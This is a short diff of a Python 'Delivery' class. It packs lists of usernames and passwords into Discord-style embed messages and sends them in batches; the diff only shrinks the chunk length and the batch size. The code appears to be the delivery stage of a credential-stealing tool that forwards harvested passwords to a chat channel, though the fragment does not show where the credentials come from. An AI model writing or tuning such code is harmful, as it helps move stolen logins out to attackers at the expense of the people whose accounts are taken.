@@ -128,7 +128,7 @@ class Delivery(Resource):
                         'username'] + cb + "\nPassword: " + cb + password['password'] + cb + "\n"
                 except:
                     pass
-                if len(embed_descriptions[i]) > 3500 and j != len(password_list) - 1:
+                if len(embed_descriptions[i]) > 1700 and j != len(password_list) - 1:
                     i += 1
                     embed_descriptions.append("")
             for description in embed_descriptions:
@@ -159,7 +159,7 @@ class Delivery(Resource):
                                    value=f"{cb}Yes{cb}✅" if "essential" in args else f"{cb}No{cb}❌", inline=True)
         embeds.append(file_embed)
 
-        batch_size = 10
+        batch_size = 3
         num_messages = (len(embeds) + batch_size - 1) // batch_size
 
         for i in range(num_messages):
